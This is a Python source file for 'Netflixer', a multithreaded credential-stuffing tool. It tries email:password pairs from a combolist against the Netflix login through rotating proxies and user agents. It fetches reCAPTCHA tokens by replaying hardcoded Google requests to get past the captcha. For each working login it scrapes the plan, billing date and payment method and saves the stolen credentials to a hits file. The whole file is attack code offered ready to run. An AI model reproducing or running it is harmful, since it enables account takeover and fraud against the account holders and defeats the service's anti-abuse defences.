import os, re, time, random, threading, requests, easygui, datefinder
from colorama import Fore
from bs4 import BeautifulSoup

# Credit to Pycenter by billythegoat356
# Github: https://github.com/billythegoat356/pycenter/
# License: https://github.com/billythegoat356/pycenter/blob/main/LICENSE

def center(var: str, space: int = None):  # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns- len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
    
    return "\n".join((" " * int(space)) + var for var in var.splitlines())

class Netflixer:
    def __init__(self):
        if os.name == "posix":
            print("WARNING: This program is designed to run on Windows only.")
            quit(1)
        self.proxies = []
        self.combos = []
        self.hits = 0
        self.bad = 0
        self.cpm = 0
        self.retries = 0
        self.lock = threading.Lock()

    def ui(self):
        os.system("cls && title [NETFLIXER] - Made by Plasmonix")
        text = """
            
                      ███▄    █ ▓█████▄▄▄█████▓  █████▒██▓     ██▓▒██   ██▒▓█████  ██▀███  
                      ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓██   ▒▓██▒    ▓██▒▒▒ █ █ ▒░▓█   ▀ ▓██ ▒ ██▒
                     ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒████ ░▒██░    ▒██▒░░  █   ░▒███   ▓██ ░▄█ ▒
                     ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░▓█▒  ░▒██░    ░██░ ░ █ █ ▒ ▒▓█  ▄ ▒██▀▀█▄  
                     ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░▒█░   ░██████▒░██░▒██▒ ▒██▒░▒████▒░██▓ ▒██▒
                     ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒ ░   ░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒▓ ░▒▓░
                     ░ ░░   ░ ▒░ ░ ░  ░   ░     ░     ░ ░ ▒  ░ ▒ ░░░   ░▒ ░ ░ ░  ░  ░▒ ░ ▒░
                        ░   ░ ░    ░    ░       ░ ░     ░ ░    ▒ ░ ░    ░     ░     ░░   ░ 
                              ░    ░  ░                   ░  ░ ░   ░    ░     ░  ░   ░    """
        faded = ""
        red = 40
        for line in text.splitlines():
            faded += f"\033[38;2;{red};0;220m{line}\033[0m\n"
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(center(faded))
        print(center(f"{Fore.LIGHTYELLOW_EX}\ngithub.com/Plasmonix\n{Fore.RESET}"))

    def cpmCounter(self):
        while True:
            old = self.hits
            time.sleep(4)
            new = self.hits
            self.cpm = (new - old) * 15

    def updateTitle(self):
        while True:
            elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start))
            os.system(
                f"title [NETFLIXER] - Hits: {self.hits} ^| Bad: {self.bad} ^| Retries: {self.retries} ^| CPM: {self.cpm} ^| Threads: {threading.active_count() - 3} ^| Time elapsed: {elapsed}"
            )
            time.sleep(0.4)

    def getProxies(self):
        try:
            print(f"[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Path to proxy file> ")
            path = easygui.fileopenbox(
                default="*.txt",
                filetypes=["*.txt"],
                title="Netflixer - Select proxy",
                multiple=False,
            )
            try:
                open(path, "r", encoding="utf-8")
            except:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open proxyfile")
                os.system("pause >nul")
                quit()

            try:
                choice = int(
                    input(
                        f"[{Fore.LIGHTBLUE_EX}?{Fore.RESET}] Proxy type [{Fore.LIGHTBLUE_EX}0{Fore.RESET}]HTTP/[{Fore.LIGHTBLUE_EX}1{Fore.RESET}]SOCKS4/[{Fore.LIGHTBLUE_EX}2{Fore.RESET}]SOCKS5> "
                    )
                )
            except:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer")
                os.system("pause >nul")
                quit()

            if choice in [0, 1, 2]:
                if choice == 0:
                    proxytype = "http"
                elif choice == 1:
                    proxytype = "socks4"
                elif choice == 2:
                    proxytype = "socks5"
                else:
                    print(
                        f"[{Fore.RED}!{Fore.RESET}] Please enter a valid choice such as 0, 1 or 2!"
                    )
                    os.system("pause >nul")
                    quit()

            with open(path, "r", encoding="utf-8") as f:
                for l in f:
                    proxy = l.strip().split(":")
                    if len(proxy) >= 2:
                        self.proxies.append(
                            {proxytype: f"{proxytype}://{proxy[0]}:{proxy[1]}"}
                        )
        except Exception as e:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {e}")
            os.system("pause >nul")
            quit()

    def getCombos(self):
        try:
            print(f"[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Path to combolist> ")
            path = easygui.fileopenbox(
                default="*.txt",
                filetypes=["*.txt"],
                title="Netflixer - Select combos",
                multiple=False,
            )
            with open(path, "r", encoding="utf-8") as f:
                for l in f:
                    self.combos.append(l.replace("\n", ""))
        except Exception as e:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open combofile")
            os.system("pause >nul")
            quit()

    def getauthURL(self):
        try:
            login = requests.get(
                "https://www.netflix.com/login",
                headers={"user-agent": random.choice(self.user_agents)},
                proxies=random.choice(self.proxies),
            )
            authURL = re.search(
                r'<input[^>]*name="authURL"[^>]*value="([^"]*)"', login.text
            ).group(1)
        except:
            self.lock.acquire()
            print(
                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN"
            )
            self.retries += 1
            self.lock.release()
            self.getauthURL()

        return authURL

    def extract_date(self, input_string):
        dates = list(datefinder.find_dates(input_string))
        return (
            max(dates, default=None, key=lambda d: len(str(d))).strftime("%d %B %Y")
            if dates
            else None
        )

    def bypass_captcha(self):
        try:
            req = requests.get(
                "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw",
                headers={
                    "Accept": "*/*",
                    "Pragma": "no-cache",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
                },
                
            )
            token = "".join(
                re.findall(
                    'type="hidden" id="recaptcha-token" value="(.*?)"', str(req.text)
                )
            )
            headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
                "origin": "https://www.google.com",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
                "Pragma": "no-cache",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "referer": "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw ",
            }
            data = {
                "v": "Km9gKuG06He-isPsP6saG8cn",
                "reason": "q",
                "c": token,
                "k": "6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
                "co": "aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz",
                "chr": "%5B38%2C84%2C94%5D",
                "vh": "-1149792284",
                "bg": "kJaglpMKAAQeH2NlbQEHDwG3HgHkYmipwKZLvmAaGCIeO2knGyVi2lcc2d6we_IGLhXPTCrcRQSrXqn4n0doqzQ2i8Aw3_eUeSUIgbovYaDXYEy1YBiouAQe5rUbIuXh6jLItmtbpiCsvNHrJfqr1eDApuNn8jqVtZfpo12Bpl28T4S-BN-zefP60wgs4AhJqZMbHngai-9VnGYfde5EihgOR2s5FgJjWkNW4g7J4VixwycoKpPM_VkmmY-Mcl6SI4svUrXzKNBLbPXY0Zjp5cLyEh7O1UTPCe8OPj0cg6S7xPPpkZR9zKmDhy5adr982aTJZTFmV8R1p1OcDmT78D03ZgPRwzgoK_IpSvgrM-IPQfE_Qu-7zclFDMSkBPLUj1VxaolIdknp8Ap7AGfixtbK4_kZuDl853ea737GPv2dppnZdXciU8rN2RJXyhjWWDYOYIxnlqfzefYHNZsxmujutGJevWfWU_4tAMie6uvg1HXDF0BDj_s9H8UE8Gykb6M3qQVt12JCK_EBcmbrg8CiT_MK4L_ys7phshwm6-9Cy5YFQ3hS9oxYO-SSDY2r9QiNXDgccVpQ528Nf7V0gG3Z9xHJVmLpwpwB_F_L6dREoaPX_UnxiJoOR1gkg04uS4BswFxmzOJpB45VKJvbaBENYQabVtIiKUhgVwiBYH7-9NHvlbuYcHtCLf6piKcmdKxQXBEjphi1HISp-nLa2bIA47mjNOylD9ZWOp05PMuPSUJxr9SUCQTym2nNLPiWj9tJkyUzy0UVi6_QSIX7vf5JaVGJB3zfs5fCXQmDC7VGPT40_sQEfxQuCRZ8y67Mq8R64OZtbnlHX7JWE80myuXHQue_EjMLCJlQbaGhEJxNF25XzzseCLgVwNNVG6uUjgq_2-BTuNdyHd38y1hcsryXqaskJ2DsFh3P0mbHxE8viABVpzBWtSRjkH_OPXa_dus8OCqQI8I60lPXJ9lWU9aCMeAkD5T6VIfFvqCXZ_bfuX7ugp9ADo5bkFcSnQJrmAobrmuOHh3zvIZmIHr4hZ7jsH_ANy_w6JNSsbifs2-BA45a7crLyEC1tuFq_yvCXR-fH3F8uSoVobZK1MreQuW_8zBrI1w1vwb7-2teKDEK41orAry1P7ib-fzo08KiPvPDJ3MQi3XQeOzAcQwRjhRNDbtAcDE-XRSkN_CsRg9dmygO-wwM7X607rH-RvNw-CBjt_pB4V-xd83GKtfI7VZZ48iNywixzOoIPsNv2_oqLHNGSc9gvMNtegcNKU7UtUiiZR5sIps",
                "size": "invisible",
                "hl": "en",
                "cb": "eeb8u2c3dizw",
            }
            req = requests.post(
                "https://www.google.com/recaptcha/api2/reload?k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
                headers=headers,
                data=data,
            )
            captcha_token = "".join(re.findall('\["rresp","(.*?)"', str(req.text)))
            return captcha_token
        except:
            self.bypass_captcha()

    def checker(self, email, password):
        try:
            client = requests.Session()
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            ]

            headers = {
                "User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-language": "en-US,en;q=0.9",
                "Accept-encoding": "gzip, deflate, br",
                "Referer": "https://www.netflix.com/login",
                "Content-type": "application/x-www-form-urlencoded",
            }

            data = {
                "Userloginid": email,
                "Password": password,
                "Remembermecheckbox": "true",
                "Flow": "websiteSignUp",
                "Mode": "login",
                "Action": "loginAction",
                "Withfields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
                "Authurl": self.getauthURL(),
                "Nextpage": "https://www.netflix.com/browse",
                "recaptchaResponseToken": self.bypass_captcha(),
                "recaptchaResponseTime": random.randint(100, 800),
            }

            req = client.post(
                "https://www.netflix.com/login",
                headers=headers,
                data=data,
                proxies=random.choice(self.proxies),
                timeout=10,
            )
            if "/browse" in req.url:
                cookie = {
                    "NetflixId": req.cookies.get("NetflixId"),
                    "SecureNetflixId": req.cookies.get("SecureNetflixId"),
                }

                info = client.get(
                    "https://www.netflix.com/YourAccount",
                    headers={
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Referer": "https://www.netflix.com/browse",
                        "User-Agent": random.choice(self.user_agents),
                    },
                    cookies=cookie,
                    proxies=random.choice(self.proxies),
                    timeout=10,
                )

                try:
                    soup = BeautifulSoup(info, "html.parser")
                    plan = re.search(r"<b>(.*?)</b>", info.text).group(1)
                    member_since = self.extract_date(
                        soup.find(
                            "div", class_="account-section-membersince"
                        ).text.strip()
                    )
                    payment_method = re.search(
                        r"paymentpicker/(\w+)\.png", info.text
                    ).group(1)
                    expiry = self.extract_date(
                        soup.find(
                            "div", {"data-uia": "nextBillingDate-item"}
                        ).text.strip()
                    )
                except:
                    pass
                self.lock.acquire()
                print(
                    f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}HIT{Fore.RESET} | {email} | {password} | {plan} | {expiry}"
                )
                self.hits += 1
                with open("./results/hits.txt", "a", encoding="utf-8") as fp:
                    fp.writelines(
                        f"{email}:{password} | Member since =  {member_since} | Plan =  {plan} | Validity =  {expiry} | Payment method = {payment_method}\n"
                    )
                self.lock.release()
            else:
                self.lock.acquire()
                print(
                    f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}BAD{Fore.RESET} | {email} | {password} "
                )
                self.bad += 1
                self.lock.release()

        except requests.exceptions.RequestException:
            self.lock.acquire()
            print(
                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN"
            )
            self.retries += 1
            self.lock.release()
        except Exception as e:
            self.lock.acquire()
            print(
                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} {e}"
            )
            self.retries += 1
            self.lock.release()

    def worker(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            combination = combos[self.check[thread_id]].split(":")
            self.checker(combination[0], combination[1])
            self.check[thread_id] += 1

    def main(self):
        self.ui()
        self.getProxies()
        self.getCombos()
        try:
            self.threadcount = int(
                input(f"[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> ")
            )
        except ValueError:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be an integer")
            os.system("pause >nul")
            quit()

        self.ui()
        self.start = time.time()
        threading.Thread(target=self.cpmCounter, daemon=True).start()
        threading.Thread(target=self.updateTitle, daemon=True).start()

        threads = []
        self.check = [0 for i in range(self.threadcount)]
        for i in range(self.threadcount):
            sliced_combo = self.combos[
                int(len(self.combos) / self.threadcount * i) : int(
                    len(self.combos) / self.threadcount * (i + 1)
                )
            ]
            t = threading.Thread(
                target=self.worker,
                args=(
                    sliced_combo,
                    i,
                ),
            )
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f"[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed")
        os.system("pause>nul")


if __name__ == "__main__":
    Netflixer().main()
